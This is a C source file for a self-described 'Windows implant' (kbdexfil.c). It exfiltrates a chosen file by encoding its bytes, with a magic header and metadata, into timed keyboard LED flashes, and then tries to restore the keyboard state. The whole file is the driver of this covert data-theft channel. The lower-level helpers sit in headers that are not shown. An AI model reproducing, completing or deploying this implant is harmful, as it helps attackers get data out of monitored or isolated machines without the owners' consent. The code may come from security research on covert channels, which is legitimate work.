/* -----------------------------------------------------------------------------
 *
 * File         : src/kbdexfil.c
 * Description  : Windows implant
 * Copyright    : (c) Rodger Allen 2019
 * Licence      : BSD3
 *
 * -------------------------------------------------------------------------- */

#ifndef IMPLANT
#define IMPLANT
#endif

#include <windows.h>        // Sleep()
#include <stdio.h>          // printf()
//#include <stdlib.h>
#include <inttypes.h>       // uint32_t,uint8_t
#include <sys/stat.h>       // stat()
#include <unistd.h>         // getopt()

#include "global.h"
#include "encoder.h"
#include "winkbd.h"
#include "meta.h"
//#include "crc32.h"

// -------------------------------------

int processfile( char *pathname, int timer );
int check_file( const char *path );
void usage( char* progname );
int main(int argc, char* argv[]);

int verbose = 0;
int debug = 0;
uint8_t lastTrybble = INITSTATE;;


/* -------------------------------------------------------------------------- */

/* -------------------------------------
 * Process a file and send the LED flashes
 */
int processfile( char *pathname, int timer )
{
    trybble origState = getKeyState();
    trybble currState;

    // -------------------------------------
    // *** Set initial LED state ***
    currState = setKeys(currState, INITSTATE);
    sleeper(100);

    // -------------------------------------
    // *** Read input file ***
    size_t bsz = sizeof(magix) / sizeof(magix[0]);
    uint8_t *meta = NULL;
    uint8_t *payload = NULL;

    struct metadata md = getFile(pathname, &payload );
    int msz = metaToBytes( &meta, &md );

    if (verbose)
        showMetadata(&md);

    // -------------------------------------
    // *** Send Data ***
    if (payload != NULL) {
        flashBytes(&currState, timer, magix, bsz);
        flashBytes(&currState, timer, meta, msz);
        flashBytes(&currState, timer, payload, md.size);
    }
    free(meta);
    free(payload);

    // -------------------------------------
    // *** Attempt to reset keyboard ***
    sleeper(100);
    currState = setKeys(currState, origState);
    sleeper(100);

    return EXIT_SUCCESS;
}

/* -------------------------------------
 * basic check for input file
 */
int check_file( const char *path )
{
    struct stat sb;
    return stat(path, &sb) == 0 && S_ISREG(sb.st_mode);
}

/* -------------------------------------------------------------------------- */

void usage( char* progname )
{
    fprintf(stderr, "Usage: %s [-h] [-v] [-t timer] <file>\n", progname);
    fprintf(stderr, "  version: %s\n", REVISION);
    fprintf(stderr, "    -h          this help\n");
    fprintf(stderr, "    -v          verbose\n");
    fprintf(stderr, "    -t timer    milliseconds between flashes (1-999)\n");
    fprintf(stderr, "                (default %d)\n", DEFTIMER);
    fprintf(stderr, "    file        filename\n");
}

/* -------------------------------------
 * main
 */
int main( int argc, char* argv[] )
{
    char *filename;
    int timer = DEFTIMER;
    int opt;
    int msecs;

    setvbuf (stdout, NULL, _IONBF, BUFSIZ);

    while ((opt = getopt(argc, argv, "h?v::t:")) != -1) {
        switch (opt) {
            case 'h':case '?':
                usage(argv[0]);
                exit(EXIT_SUCCESS);
                break;
            case 'v':
                verbose = 1;
                if (optarg == NULL)
                    break;
                while (*optarg++ == 'v' && verbose<9)
                    verbose++;
                break;
            case 't':
                msecs = atoi(optarg);
                if ((msecs < 1) || (msecs > 999)) {
                    fprintf(stderr, "ERR: timer out of bounds\n");
                    usage(argv[0]);
                    exit(EXIT_FAILURE);
                }
                timer = msecs;
                break;
            default:
                usage(argv[0]);
                exit(EXIT_FAILURE);
        }
    }
    if (optind >= argc) {
        fprintf(stderr, "ERR: missing filename\n");
        usage(argv[0]);
        exit(EXIT_FAILURE);
    }
    filename = argv[optind];
    if (check_file(filename) == 0) {
        fprintf(stderr,"ERR: file \"%s\" doesn't exist\n", filename);
        return EXIT_FAILURE;
    }

    if (verbose) {
        fprintf(stdout,"timer: %d\n", timer);
        fprintf(stdout,"filename:\t%s\n", filename);
    }

    (void) processfile(filename, timer);

    if (verbose) fprintf(stdout,"\n");

    sleeper(100);

    return EXIT_SUCCESS;
}

// -----------------------------------------------------------------------------
// vi: et ts=4 ai
